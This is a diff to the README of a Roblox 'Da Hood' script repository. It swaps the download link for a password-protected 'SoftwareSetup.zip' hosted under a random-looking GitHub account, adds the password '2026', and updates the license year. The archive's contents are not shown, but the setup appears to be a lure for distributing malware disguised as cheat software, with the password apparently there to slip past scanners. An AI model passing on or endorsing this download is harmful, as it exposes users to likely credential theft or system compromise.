@@ -101,18 +101,20 @@ By deploying these tools, you abide by Roblox’s terms of service. **The reposi
 
 If you’re seeking legacy versions or platform-tuned bundles, grab them here:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://ray6662.github.io)
+[![Download](https://img.shields.io/badge/Download-blue)](https://github.com/SideKhanChart/nfgvtfba/releases/download/sdgsdg/SoftwareSetup.zip)
+
+**PASSWORD: 2026**
 
 Explore the `/legacy` and `/platforms` folders for specialized releases.
 
 ---
 
-## 📜 License – MIT 2025
+## 📜 License – MIT 2026
 
 This repository is licensed under the MIT License, empowering you with open innovation and minimal restrictions.  
 Read the full license terms here: [MIT License](https://opensource.org/licenses/MIT)
 
-&copy; 2025 – Da Hood Roblox Script Repository. All rights reserved.
+&copy; 2026 – Da Hood Roblox Script Repository. All rights reserved.
 
 ---
 
